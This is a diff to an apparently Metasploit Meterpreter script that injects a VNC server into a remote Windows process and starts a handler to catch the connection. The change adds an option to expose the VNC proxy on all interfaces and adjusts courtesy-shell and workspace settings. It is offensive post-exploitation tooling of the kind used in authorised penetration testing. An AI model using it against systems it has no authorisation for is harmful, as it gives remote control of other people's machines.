@@ -16,6 +16,7 @@ opts = Rex::Parser::Arguments.new(
 	"-i"  => [ false,  "Inject the vnc server into a new process's memory instead of building an exe"],
 	"-P"  => [ true,   "Executable to inject into (starts a new process).  Only useful with -i (default: notepad.exe)"],
 	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
+	"-O"  => [ false,  "Disable binding the VNC proxy to localhost (open it to the network)"],
 	"-V"  => [ false,  "Disable the automatic launch of the VNC client"],
 	"-t"  => [ false,  "Tunnel through the current session connection. (Will be slower)"],
 	"-c"  => [ false,  "Enable the VNC courtesy shell"]
@@ -32,10 +33,12 @@ lhost    = "127.0.0.1"
 
 autoconn = true
 autovnc  = true
+anyaddr  = false
 courtesy = false
 tunnel   = false
 inject   = false
 runme    = "notepad.exe"
+pay      = nil
 
 #
 # Option parsing
@@ -53,6 +56,8 @@ opts.parse(args) do |opt, idx, val|
 		runme = val
 	when "-D"
 		autoconn = false
+	when "-O"
+		anyaddr = true
 	when "-V"
 		autovnc = false
 	when "-c"
@@ -85,17 +90,23 @@ else
 	pay.datastore['LPORT'] = rport
 end
 
+if (not courtesy)
+	pay.datastore['DisableCourtesyShell'] = true
+end
+
+if (anyaddr)
+	pay.datastore['VNCHOST'] = "0.0.0.0"
+end
+
 if autoconn
 	mul = client.framework.exploits.create("multi/handler")
 	mul.share_datastore(pay.datastore)
 
+	mul.datastore['WORKSPACE'] = client.workspace
 	mul.datastore['PAYLOAD'] = payload
 	mul.datastore['EXITFUNC'] = 'process'
 	mul.datastore['ExitOnSession'] = true
 	mul.datastore['WfsDelay'] = 7
-	if (not courtesy)
-		mul.datastore['DisableCourtesyShell'] = true
-	end
 
 	mul.datastore['AUTOVNC'] = autovnc
 
